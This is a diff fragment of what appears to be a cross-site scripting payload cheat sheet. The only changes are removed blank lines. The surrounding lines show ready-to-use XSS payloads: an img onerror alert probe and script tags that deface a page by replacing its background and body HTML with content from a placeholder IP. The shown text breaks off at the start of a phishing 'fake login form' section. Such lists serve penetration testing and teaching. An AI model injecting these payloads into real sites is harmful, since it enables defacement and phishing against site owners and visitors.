@@ -11,7 +11,6 @@
 <img src="" onerror=alert(window.origin)>
 <img src="https://x.x.x.x">
 ```
-
 ### Defacing
 
 ```bash
@@ -20,7 +19,6 @@
 <script>document.body.background = "https://x.x.x.x/images/image.svg"</script>
 <script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Header Text</h1><p style="color: white">by <img src="https://x.x.x.x/images/image.svgg" height="25px" alt="ALT Text"> </p></center>'</script>
 ```
-
 ### Phishing
 
 Fake login form:
